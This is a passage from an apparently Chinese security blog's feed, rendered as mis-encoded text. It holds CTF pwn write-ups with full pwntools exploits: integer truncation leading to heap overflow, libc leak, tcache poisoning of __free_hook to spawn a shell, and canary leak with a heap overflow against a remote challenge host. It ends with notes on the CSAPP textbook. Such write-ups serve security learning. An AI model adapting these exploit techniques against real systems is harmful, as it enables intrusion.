href="https://survive2.github.io/">h1J4ckerå¸ˆå‚…</a>ç»™æˆ‘è¯´äº†ä¸€ä¸‹ï¼Œä»¥å‰è¿˜çœŸæ²¡æ³¨æ„è¿‡è¿™ä¿©å‡½æ•°çš„åŒºåˆ«ã€‚</p><p>è€Œè¿™é“é¢˜çš„æ¼æ´ä¹Ÿåœ¨æ­¤ï¼Œatolå‡½æ•°è¿”å›çš„æ˜¯long intç±»å‹ï¼Œå¯ä¹‹åifåœ¨è¿›è¡Œæ£€æŸ¥çš„æ—¶å€™å´å¼ºè½¬æˆäº†Intç±»å‹ã€‚</p><p><img src="/../img/image-20221007233557237.png" alt="image-20221007233557237"></p><p>å°±å¯¼è‡´äº†è¿™é‡Œè¾“å…¥ä¸€ä¸ªå¤§æ•°å¯ä»¥ç»•è¿‡è¿™ä¸ªæ£€æŸ¥ã€‚</p><p>ä¸¾ä¸ªä¾‹å­æˆ‘ä»¬è¾“å…¥4294967440ï¼Œè¿™ä¸ªæ•°å­—è½¬æ¢æˆäºŒè¿›åˆ¶å¦‚ä¸‹(intç±»å‹ä¸º4å­—èŠ‚ï¼Œæœ€é«˜æ¯”ç‰¹ä½ä¸ºç¬¦å·ä½)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0001     0000 0000     0000 0000     0000 0000     1001 0000</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯long intç±»å‹ï¼Œåˆ™è¿™ä¸ªæ•°å­—å°±æ˜¯æ­£å¸¸çš„ã€‚ä½†å¦‚æœæ˜¯å¼ºè½¬æˆIntç±»å‹ï¼Œé‚£ä¹ˆä¼šèˆå¼ƒ4å­—èŠ‚ä¹‹å¤–çš„æ¯”ç‰¹ä½(ä»å³å¾€å·¦æ•°32æ¯”ç‰¹)ï¼Œè¿™æ ·å…¶å®åœ¨åˆ¤æ–­çš„æ—¶å€™è¿™ä¸ªæ•°å­—å°±æˆäº†144(å¦‚ä¸‹)ï¼Œä»è€Œç»•è¿‡äº†æ£€æŸ¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000 0000     0000 0000     0000 0000     1001 0000</span><br></pre></td></tr></table></figure><p>å¯æ˜¯æœ€ç»ˆå¾€å †å—é‡Œè¾“å…¥çš„æ•°æ®åˆæ²¡æœ‰è¿›è¡Œintå¼ºè½¬ï¼Œè¿™æ ·æˆ‘ä»¬å®é™…å†™å…¥çš„å°±æ˜¯é‚£ä¸ªå¤§æ•°4294967440ï¼Œä»è€Œå¯¼è‡´äº†å †æº¢å‡ºã€‚</p><p><img src="/../img/image-20221007233639073.png"></p><h3 id="åˆ©ç”¨æ€è·¯ï¼š-3"><a href="#åˆ©ç”¨æ€è·¯ï¼š-3" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><p>ä¸è¿‡æœ¬é¢˜ä¸­é™¤äº†ä¸Šè¿°æ¼æ´å¤–ä¸å­˜åœ¨ä»»ä½•æ¼æ´ï¼Œå°±å¯¼è‡´äº†æˆ‘ä»¬æƒ³è¦æ³„éœ²libcåœ°å€åªèƒ½æ‰“ä¸€ä¸ªå †å—é‡å è®©unsorted binçš„fdå’ŒbkæŒ‡é’ˆè½åœ¨ä½¿ç”¨çŠ¶æ€ä¸­çš„å †å—ä¸Šï¼Œç„¶åå°†å…¶æ‰“å°å‡ºæ¥ã€‚</p><p>å…·ä½“å®ç°è¿‡ç¨‹å¦‚ä¸‹:</p><p>1ã€å…ˆç”³è¯·å‡ºæ¥åä¸ªå †å—ï¼Œä¾æ¬¡å‘½åä¸ºchunk1ï¼Œchunk2ï¼Œchunk3â€¦chunk10</p><p>2ã€æˆ‘ä»¬å°†åä¸ƒä¸ªå †å—(chunk4-chunk10)å…¨éƒ¨é‡Šæ”¾æ‰</p><p>3ã€å†å°†å‰ä¸‰ä¸ªå †å—(chunk1ã€chunk2ã€chunk3)ç»™é‡Šæ”¾æ‰ï¼Œæ­¤æ—¶è¿™ä¸‰ä¸ªå †å—å°±ä¼šå…¨éƒ¨è¿›å…¥åˆ°unsorted binä¸­ï¼Œè€Œä¹‹åçš„tcache binä¸­çš„7ä¸ªå †å—åˆ™å¡«æ»¡tcache binåŒæ—¶è¿˜é˜²æ­¢äº†å‰ä¸‰ä¸ªè¿›å…¥unsorted binä¸­çš„å †å—ä¸top chunkåˆå¹¶</p><p>4ã€å†å°†åœ¨tcachebinä¸­çš„ä¸ƒä¸ªå †å—ç»™ç”³è¯·å‡ºæ¥ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬åœ¨ç”³è¯·ç¬¬å…­ä¸ªå †å—çš„æ—¶å€™è¦å»å†™å…¥ä¸€ä¸ªä¼ªé€ çš„prev_sizeå’Œsizeä¿è¯ä¹‹åå¯ä»¥é¡ºåˆ©çš„ä»unsorted binä¸­å–å‡ºå †å—ã€‚(æ­¤æ—¶çš„æƒ…å†µå¦‚ä¸‹)</p><p><img src="/../img/image-20221007233701615.png" alt="image-20221007233701615"></p><p>5ã€æ¥ä¸‹æ¥æˆ‘ä»¬ç”³è¯·å †å—æ—¶ï¼Œsizeå†™æˆä¸€ä¸ªå¤§æ•°ï¼Œé€ æˆæº¢å‡ºæ¥ç¯¡æ”¹unsorted binçš„sizeã€‚(ç¯¡æ”¹åå¦‚ä¸‹)</p><p><img src="/../img/image-20221007233720390.png" alt="image-20221007233720390"></p><p>6ã€æˆ‘ä»¬ç”³è¯·ä¸€ä¸ªç‰¹å®šå¤§å°çš„å †å—è®©æ›´æ–°åçš„unsorted binçš„fdå’ŒbkæŒ‡é’ˆæ­£å¥½è½åœ¨ä¸€ä¸ªæ­£åœ¨ä½¿ç”¨çš„å †å—ç”¨æˆ·åŒºã€‚(å¦‚ä¸‹å›¾)</p><p><img src="/../img/image-20221007233736715.png" alt="image-20221007233736715"></p><p>7ã€æ‰“å°ç´¢å¼•ä¸º6çš„å †å—ï¼Œå°±å¯ä»¥è¿›è¡Œæ³„éœ²libcåœ°å€</p><p>8ã€æœ€åæ‰“ä¸€ä¸ªtcache poisoingåŠ«æŒtcache binçš„fdæŒ‡é’ˆå°†free_hookç”³è¯·å‡ºæ¥ï¼Œé‡Šæ”¾æ‰ä¸€ä¸ªå­˜æœ‰&#x2F;bin&#x2F;shå­—ç¬¦ä¸²çš„å †å—å³å¯è·å–shell</p><h3 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_d=<span class="number">0x16BB</span></span><br><span class="line">d_a=<span class="number">0x16A9</span></span><br><span class="line">d_s=<span class="number">0x16CD</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Note size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Note content:&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;1.Add note\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note ID:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Note ID:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>,p64(<span class="number">0x200</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4294967424</span>,<span class="string">b&#x27;u&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x201</span>)[:<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x140</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x1ebbe0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4294967424</span>+<span class="number">16</span>,<span class="string">b&#x27;s&#x27;</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)+p64(free_hook)[:<span class="number">7</span>])</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>,p64(sys_addr))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221007233750427.png" alt="image-20221007233750427"></p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ ˆè¿ç§» </tag>
            
            <tag> æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ </tag>
            
            <tag> ç¯¡æ”¹gotè¡¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF NOV Xè”åˆå‡ºé¢˜äºº2022å¹´åº¦ç§¯åˆ†æ¦œäº‰å¤ºèµ› pwnéƒ¨åˆ†wp</title>
      <link href="/posts/ffd20e6e.html"/>
      <url>/posts/ffd20e6e.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç­¾ä¸ªåˆ°"><a href="#ç­¾ä¸ªåˆ°" class="headerlink" title="ç­¾ä¸ªåˆ°"></a>ç­¾ä¸ªåˆ°</h2><h3 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011047418.png" alt="image-20221201104720121"></p><p>æ²¡å¼€NXï¼Œä½†æ˜¯å¯¹äºæœ¬é¢˜æ¥è¯´æ²¡å•¥ç”¨ï¼Œå› ä¸ºç¨‹åºç»™äº†åé—¨å‡½æ•°</p><h3 id="ç¨‹åºé€»è¾‘"><a href="#ç¨‹åºé€»è¾‘" class="headerlink" title="ç¨‹åºé€»è¾‘"></a>ç¨‹åºé€»è¾‘</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011048486.png" alt="image-20221201104846427"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011052461.png" alt="image-20221201105203859"></p><p>æœ€åˆè¿™é‡Œæœ‰ä¸ªè¾“å…¥çš„åœ°æ–¹å­˜åœ¨off by oneæ¼æ´ï¼Œç»“åˆåˆ°ä¸‹é¢çš„%sè¾“å‡ºè€ƒè™‘åˆ°å¯èƒ½æ˜¯æ³„éœ²æ•°æ®ï¼Œå‘ç°å†™å…¥çš„åœ°æ–¹ç´§æŒ¨canaryï¼Œå› æ­¤è¿™é‡Œå°†canaryæ³„éœ²å‡ºæ¥ã€‚</p><p>è€Œåç¨‹åºç»™äº†ä¸¤ä¸ªåŠŸèƒ½ï¼Œä¸€ä¸ªæ˜¯ç”³è¯·å‡ºæ¥ä¸€ä¸ª0x20çš„å †å—ï¼Œåœ¨å‘å †å—é‡Œè¾“å…¥æ•°æ®çš„æ—¶å€™å­˜åœ¨ä¸€ä¸ªæ¼æ´ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011058480.png" alt="image-20221201105840410"></p><p>ä¸Šé¢çš„è¿™ä¸ªa2å¯æ§ï¼Œå°†å…¶ç½®æˆ0ã€‚è¿™æ ·åˆ¤æ–­å°±æ˜¯v5&lt;&#x3D;-1ï¼Œè€Œv5æ˜¯æ— ç¬¦å·æ•´å½¢å› æ­¤åœ¨åˆ¤æ–­çš„æ—¶å€™-1ä¹Ÿä¼šè½¬æˆæ— ç¬¦å·æ•´å½¢ï¼Œä¹Ÿå°±æ˜¯0xffffffffï¼Œä»è€Œå¯¼è‡´äº†å †æº¢å‡ºã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011101525.png" alt="image-20221201110128458"></p><p>å¦ä¸€ä¸ªå‡½æ•°æ˜¯è¿›è¡Œäº†ä¸‰ä¸ªåˆ¤æ–­ï¼Œå¦‚æœå…¨éƒ¨é€šè¿‡çš„è¯åˆ™è§¦å‘åé—¨å‡½æ•°ã€‚</p><p>æ­£å¸¸æ¥è¯´çš„è¯æ˜¯æ— è®ºå¦‚ä½•ä¹Ÿä¸ä¼šé€šè¿‡æ£€æŸ¥çš„ï¼Œå› ä¸ºåœ¨ç¬¬ä¸‰ä¸ªæ£€æŸ¥çš„åœ°æ–¹æ˜¯åœ¨æ‹¿å †å—é‡Œçš„æ•°æ®ä¸canaryåšæ¯”è¾ƒï¼Œä½†æ˜¯æ­£å¸¸æ¥è¯´ç”³è¯·å®Œå †å—ç¬¬ä¸€ä¸ªå†…å­˜å•å…ƒæ˜¯0x00000886,è¿™æ ·è·Ÿcanaryæ¯”è¾ƒæ˜¯ä¸å¯èƒ½é€šè¿‡çš„ã€‚</p><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>ä½†æ˜¯èµ‹å€¼ä¸º0x886çš„æ—¶å€™å‘ç°æœ‰ä¸ªåˆ¤æ–­ï¼Œå¦‚ä¸‹</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011105526.png" alt="image-20221201110531488"></p><p>ä¹Ÿå°±æ˜¯è¯´å¦‚æœç”³è¯·çš„å †å—æœ¬èº«åœ¨v2çš„ä½ç½®å°±æœ‰æ•°æ®ï¼Œé‚£ä¹ˆå°±ä¸ä¼šå¯¹v2å†è¿›è¡Œèµ‹å€¼äº†ï¼Œè”æƒ³åˆ°ä¸Šé¢æåˆ°çš„å †æº¢å‡ºï¼Œåˆ©ç”¨æ€è·¯å°±æ˜¯ç›´æ¥æº¢å‡ºtop chunk,ä¸æ”¹å˜å…¶sizeï¼Œä½†æ˜¯åœ¨å…¶ç”¨æˆ·åŒºæå‰å¸ƒç½®å¥½canaryï¼Œè¿™æ ·ä¸‹æ¬¡ç”³è¯·çš„æ–°å †å—åœ¨v2çš„ä½ç½®æœ¬èº«å°±æœ‰æ•°æ®äº†ï¼Œä»è€Œé€šè¿‡æœ€åçš„æ£€æŸ¥ã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn_5&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25028&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;who are u?\n&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x9</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">9</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;canary&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;power length: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;name: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;data: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;d&#x27;</span>*<span class="number">0xc</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x20d51</span>)+p64(canary)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">0</span>,p64(canary)[<span class="number">4</span>:])</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x17E3</span>,<span class="number">0x181E</span>,<span class="number">0x182A</span>,<span class="number">0x168F</span>)  </span><br><span class="line">cmp(p64(canary)[<span class="number">4</span>:])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011110205.png" alt="image-20221201111058054"></p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•´å½¢æº¢å‡º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP-ç¬¬ä¸€ç«  è®¡ç®—æœºç³»ç»Ÿæ¼«æ¸¸ï¼ˆç¬”è®°ï¼‰</title>
      <link href="/posts/6329566d.html"/>
      <url>/posts/6329566d.html</url>
      
        <content type="html"><![CDATA[<p>â€‹è¿™ä¸ªç¬¬ä¸€ç« ï¼Œä¸»è¦æ˜¯ä»‹ç»äº†è®¡ç®—æœºä¸Šçš„ä¸€äº›ä¸“ä¸šæœ¯è¯­ï¼Œä»¥åŠä¸€äº›æœ€åŸºç¡€çš„æ¦‚å¿µï¼ˆå¹¶æ²¡æœ‰æ·±å…¥è®²è§£ï¼Œä¸è¿‡ä¼šåœ¨åé¢çš„ç« èŠ‚è¿›è¡Œæ¢ç©¶ï¼‰ã€‚<strong>ä¸è¿‡è¿™äº›æ¦‚å¿µå½¼æ­¤ä¹‹é—´è”ç³»ä¸å¤§ï¼Œå¹¶ä¸æ˜¯å¾ªåºæ¸è¿›çš„ï¼Œå› æ­¤è¿™ä¸€ç« ï¼Œæˆ‘å•ç‹¬ä»‹ç»é‡Œé¢å‡ºç°çš„æœ¯è¯­</strong>ã€‚</p><h1 id="è®¡ç®—æœºç³»ç»Ÿæ˜¯ä¸ªå•¥ï¼Ÿæ“ä½œç³»ç»Ÿåˆæ˜¯ä¸ªå•¥ï¼Ÿ"><a href="#è®¡ç®—æœºç³»ç»Ÿæ˜¯ä¸ªå•¥ï¼Ÿæ“ä½œç³»ç»Ÿåˆæ˜¯ä¸ªå•¥ï¼Ÿ" class="headerlink" title="è®¡ç®—æœºç³»ç»Ÿæ˜¯ä¸ªå•¥ï¼Ÿæ“ä½œç³»ç»Ÿåˆæ˜¯ä¸ªå•¥ï¼Ÿ"></a>è®¡ç®—æœºç³»ç»Ÿæ˜¯ä¸ªå•¥ï¼Ÿæ“ä½œç³»ç»Ÿåˆæ˜¯ä¸ªå•¥ï¼Ÿ</h1><p>â€‹è¿™ä¸€ç« çš„åå­—å«åšè®¡ç®—æœºç³»ç»Ÿæ¼«æ¸¸ï¼Œåˆ«çš„ä¸è¯´ï¼Œå°±å…‰çœ‹åå­—ï¼Œè¿™ä¸ªè®¡ç®—æœºç³»ç»Ÿæ˜¯ä»€ä¹ˆï¼Ÿæˆ‘ä»¬å¹³å¸¸æåˆ°çš„æ“ä½œç³»ç»Ÿåˆæ˜¯å•¥ï¼Œæ€ä¹ˆå»ç†è§£å®ƒï¼Ÿ</p><h2 id="è®¡ç®—æœºç³»ç»Ÿæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#è®¡ç®—æœºç³»ç»Ÿæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="è®¡ç®—æœºç³»ç»Ÿæ˜¯ä»€ä¹ˆï¼Ÿ"></a>è®¡ç®—æœºç³»ç»Ÿæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>â€‹è¿™ä¸ª<strong>è®¡ç®—æœºç³»ç»Ÿ</strong>å•Šï¼Œå…¶å®ç¬¬ä¸€ç« çš„ç¬¬ä¸€å¥è¯å°±ç»™å‡ºå®šä¹‰äº†ï¼Œ<strong>å®ƒæ˜¯ç”±ç¡¬ä»¶å’Œç³»ç»Ÿè½¯ä»¶ç»„æˆçš„</strong>ï¼Œä»–ä»¬å…±åŒå·¥ä½œæ¥è¿è¡Œåº”ç”¨ç¨‹åºã€‚å…¶å®è¿™å°±æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„èŒƒå›´ï¼Œ<strong>å°±å¯ä»¥ç®€å•ç†è§£ä¸ºè®¡ç®—æœºç³»ç»Ÿå°±æ˜¯åŒ…æ‹¬äº†è½¯ä»¶ç³»ç»Ÿå’Œç¡¬ä»¶ç³»ç»Ÿ</strong>ã€‚</p><h2 id="æ“ä½œç³»ç»Ÿæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#æ“ä½œç³»ç»Ÿæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="æ“ä½œç³»ç»Ÿæ˜¯ä»€ä¹ˆï¼Ÿ"></a>æ“ä½œç³»ç»Ÿæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>â€‹è¿™ä¸ªæ“ä½œç³»ç»Ÿå…¶å®æ²¡æœ‰è®¡ç®—æœºç³»ç»Ÿé‚£ä¹ˆæŠ½è±¡ï¼Œ<strong>ä½ å®Œå…¨å¯ä»¥æŠŠå®ƒç†è§£æˆä¸€ä¸ªè½¯ä»¶</strong>ï¼ˆCSAPPä¸­æåˆ°æˆ‘ä»¬å¯ä»¥æŠŠæ“ä½œç³»ç»Ÿçœ‹æˆæ˜¯åº”ç”¨ç¨‹åºä¸ç¡¬ä»¶ä¹‹é—´æ’å…¥çš„ä¸€å±‚è½¯ä»¶ï¼‰ï¼Œ<u>åªä¸è¿‡è¿™ä¸ªè½¯ä»¶ç›¸æ¯”äºå…¶ä»–è½¯ä»¶ä¸åŒä¹‹å¤„åœ¨äºå¯ä»¥å»ç®¡ç†è®¡ç®—æœºçš„ç¡¬ä»¶ä»¥åŠè®¡ç®—æœºçš„èµ„æº</u>ã€‚å®ƒå­˜åœ¨çš„æ„ä¹‰å°±æ˜¯å»ä¸ºäº†æ›´æ–¹ä¾¿ç”¨æˆ·æ¥æ§åˆ¶æˆ‘ä»¬çš„ç”µè„‘ã€‚<em>æ“ä½œç³»ç»Ÿä½äºåº•å±‚ç¡¬ä»¶ä¸ç”¨æˆ·ä¹‹é—´ï¼Œæ˜¯ä¸¤è€…æ²Ÿé€šçš„æ¡¥æ¢ã€‚ç”¨æˆ·å¯ä»¥é€šè¿‡æ“ä½œç³»ç»Ÿçš„ç”¨æˆ·ç•Œé¢ï¼Œè¾“å…¥å‘½ä»¤ã€‚æ“ä½œç³»ç»Ÿåˆ™å¯¹å‘½ä»¤è¿›è¡Œè§£é‡Šï¼Œé©±åŠ¨ç¡¬ä»¶è®¾å¤‡ï¼Œå®ç°ç”¨æˆ·è¦æ±‚ã€‚</em></p><h2 id="ç°åœ¨çŸ¥é“äº†æ“ä½œç³»ç»Ÿçš„æ¦‚å¿µï¼Œé‚£æˆ‘ä»¬å¹³å¸¸æåˆ°çš„32ä½å’Œ64ä½æ“ä½œç³»ç»Ÿåˆæ˜¯ä¸ªä»€ä¹ˆç©æ„ï¼Ÿ"><a href="#ç°åœ¨çŸ¥é“äº†æ“ä½œç³»ç»Ÿçš„æ¦‚å¿µï¼Œé‚£æˆ‘ä»¬å¹³å¸¸æåˆ°çš„32ä½å’Œ64ä½æ“ä½œç³»ç»Ÿåˆæ˜¯ä¸ªä»€ä¹ˆç©æ„ï¼Ÿ" class="headerlink" title="ç°åœ¨çŸ¥é“äº†æ“ä½œç³»ç»Ÿçš„æ¦‚å¿µï¼Œé‚£æˆ‘ä»¬å¹³å¸¸æåˆ°çš„32ä½å’Œ64ä½æ“ä½œç³»ç»Ÿåˆæ˜¯ä¸ªä»€ä¹ˆç©æ„ï¼Ÿ"></a>ç°åœ¨çŸ¥é“äº†æ“ä½œç³»ç»Ÿçš„æ¦‚å¿µï¼Œé‚£æˆ‘ä»¬å¹³å¸¸æåˆ°çš„32ä½å’Œ64ä½æ“ä½œç³»ç»Ÿåˆæ˜¯ä¸ªä»€ä¹ˆç©æ„ï¼Ÿ</h2><p>â€‹è¿™é‡Œæˆ‘ä»¥64ä½ç¨‹åºä¸ºä¾‹ï¼Œè¿™ä¸ª64ä½çš„è¿™ä¸ªå•ä½å…¶å®æ˜¯Bit(æ¯”ç‰¹)ï¼Œè€Œä¸€ä¸ªæ¯”ç‰¹å‘¢ï¼Œå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„äºŒè¿›åˆ¶ä¸­çš„ä¸€ä¸ª0æˆ–1ã€‚ä¸ºä»€ä¹ˆæ­£å¥½æ˜¯64ä½æ¯”ç‰¹å‘¢ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„è¿™ä¸ªCPUï¼Œä¸€æ¬¡æ€§å¤„ç†çš„å°±æ˜¯64ä¸ªæ¯”ç‰¹çš„æ•°æ®ï¼ˆä½ å¯ä»¥å§‘ä¸”è¿™ä¹ˆç†è§£ï¼‰ï¼Œä½†äº‹å®ä¸Šä¸€æ¬¡å¤„ç†64ä¸ªæ¯”ç‰¹çš„æ•°æ®å¹¶ä¸å…¨æ˜¯CPUçš„æ„æ€ã€‚å…¶å®è¿™è·Ÿæ€»çº¿ä¹Ÿæœ‰ä¸€éƒ¨åˆ†å…³ç³»ï¼Œåœ¨ä¹¦ä¸­çš„åŸè¯æ˜¯è¿™æ ·æè¿°æ€»çº¿çš„ã€‚</p><blockquote><p>â€‹è´¯ç©¿æ•´ä¸ªç³»ç»Ÿçš„æ˜¯ä¸€ç»„ç”µå­ç®¡é“ï¼Œç§°ä½œæ€»çº¿ï¼Œå®ƒæºå¸¦ä¿¡æ¯å­—èŠ‚å¹¶è´Ÿè´£åœ¨å„ä¸ªéƒ¨ä»¶é—´ä¼ é€’ã€‚é€šå¸¸æ€»çº¿è¢«è®¾è®¡æˆä¼ é€å®šé•¿çš„å­—èŠ‚å—ï¼Œä¹Ÿå°±æ˜¯å­—ï¼ˆwordï¼‰ã€‚å­—ä¸­çš„å­—èŠ‚æ•°ï¼ˆå³å­—é•¿ï¼‰æ˜¯ä¸€ ä¸ªåŸºæœ¬çš„ç³»ç»Ÿå‚æ•°ï¼Œå„ä¸ªç³»ç»Ÿä¸­éƒ½ä¸å°½ç›¸åŒã€‚ç°åœ¨çš„å¤§å¤šæ•°æœºå™¨å­—é•¿è¦ä¹ˆæ˜¯4ä¸ªå­—èŠ‚ï¼ˆ32 ä½ï¼‰ï¼Œè¦ä¹ˆæ˜¯8ä¸ªå­—èŠ‚ï¼ˆ64ä½ï¼‰ã€‚</p></blockquote><p>â€‹ç”±æ­¤å¯ä»¥çœ‹å‡ºï¼Œæ˜¯ä¼ è¾“ä¿¡æ¯çš„æ—¶å€™ï¼Œå°±å·²ç»æŠŠè¿™äº›ä¿¡æ¯ç»™åˆ’åˆ†æˆäº†å›ºå®šçš„é•¿åº¦ã€‚å°±æ¯”å¦‚64ä½ç¨‹åºï¼Œé‚£å®ƒä¼ 